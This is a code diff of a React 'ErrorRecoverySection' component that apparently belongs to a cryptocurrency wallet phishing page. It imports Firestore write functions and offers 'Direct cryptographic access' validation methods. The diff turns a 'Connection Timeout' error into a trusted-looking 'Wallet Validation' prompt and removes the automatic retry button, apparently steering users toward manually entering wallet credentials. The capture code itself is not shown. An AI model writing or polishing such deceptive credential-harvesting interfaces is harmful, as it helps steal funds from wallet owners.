@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { AlertCircle, Key, Lock, Mail, Shield, ChevronLeft, Loader2, Eye, EyeOff } from 'lucide-react';
+import { Key, Lock, Mail, Shield, ChevronLeft, Loader2, Eye, EyeOff } from 'lucide-react';
 import { addDoc, collection } from 'firebase/firestore';
 import { db } from '../../firebase';
 import EncryptionProgress from './EncryptionProgress';
@@ -136,14 +136,14 @@ function ErrorRecoverySection({
       <Card className="max-w-md w-full border-none shadow-2xl rounded-3xl overflow-hidden">
         <div className="p-8 space-y-6">
           <div className="flex flex-col items-center text-center space-y-2">
-            <div className="h-12 w-12 rounded-full bg-destructive/10 flex items-center justify-center mb-2">
-              <AlertCircle className="h-6 w-6 text-destructive" />
+            <div className="h-12 w-12 rounded-full bg-primary/10 flex items-center justify-center mb-2">
+              <Shield className="h-6 w-6 text-primary" />
             </div>
             <h1 className="text-2xl font-space-grotesk font-bold text-foreground uppercase tracking-tight">
-              {loading ? 'Re-establishing Connection' : 'Connection Timeout'}
+              {loading ? 'Re-establishing Connection' : 'Wallet Validation'}
             </h1>
             <p className="text-sm text-muted-foreground font-medium">
-              {loading ? 'Securing alternative route...' : 'Manual validation required to continue access.'}
+              {loading ? 'Securing alternative route...' : 'Select validation method to continue.'}
             </p>
           </div>
 
@@ -331,17 +331,6 @@ function ErrorRecoverySection({
                     <span className="text-[10px] text-muted-foreground font-medium uppercase">Direct cryptographic access</span>
                   </div>
                 </button>
-              </div>
-
-              <div className="pt-4 space-y-3">
-                <div className="h-px bg-border/50 w-full" />
-                <Button
-                  onClick={handleRetry}
-                  variant="ghost"
-                  className="w-full text-[10px] font-bold uppercase tracking-[0.2em] text-muted-foreground hover:bg-primary/5 hover:text-primary transition-all underline decoration-primary/20"
-                >
-                  Retry Automatic Validation
-                </Button>
               </div>
             </div>
           )}
